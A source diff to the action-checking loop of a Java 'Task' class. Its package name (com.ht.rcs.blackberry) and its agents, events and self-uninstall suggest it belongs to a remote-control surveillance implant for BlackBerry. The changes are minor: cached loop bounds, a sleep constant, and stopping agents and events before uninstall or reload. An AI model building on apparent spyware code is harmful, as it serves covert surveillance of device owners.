@@ -23,6 +23,8 @@ import com.ht.rcs.blackberry.utils.Utils;
  */
 public class Task {
 
+    private static final int SLEEPING_TIME = 1000;
+
     /** The debug. */
     private static Debug debug = new Debug("Task", DebugLevel.VERBOSE);
 
@@ -71,7 +73,8 @@ public class Task {
             //debug.trace("checkActions");
             Vector actions = this.status.getActionsList();
 
-            for (int i = 0; i < actions.size(); i++) {
+            int asize = actions.size();
+            for (int i = 0; i < asize; ++i) {
                 Action action = (Action) actions.elementAt(i);
 
                 if (action.isTriggered() == false) {
@@ -84,7 +87,8 @@ public class Task {
 
                 Vector subActions = action.getSubActionsList();
 
-                for (int j = 0; j < subActions.size(); j++) {
+                int ssize = subActions.size();
+                for (int j = 0; j < ssize;  ++j) {
 
                     SubAction subAction = (SubAction) subActions.elementAt(j);
                     boolean ret = subAction.execute();
@@ -95,17 +99,21 @@ public class Task {
 
                     if (subAction.wantUninstall()) {
                         debug.warn("CheckActions() uninstalling");
+                        agentManager.stopAll();
+                        eventManager.stopAll();
                         return false;
                     }
 
                     if (subAction.wantReload()) {
                         debug.warn("CheckActions() reloading");
+                        agentManager.stopAll();
+                        eventManager.stopAll();
                         return true;
                     }
                 }
             }
 
-            Utils.sleep(600);
+            Utils.sleep(SLEEPING_TIME);
         }
 
     }
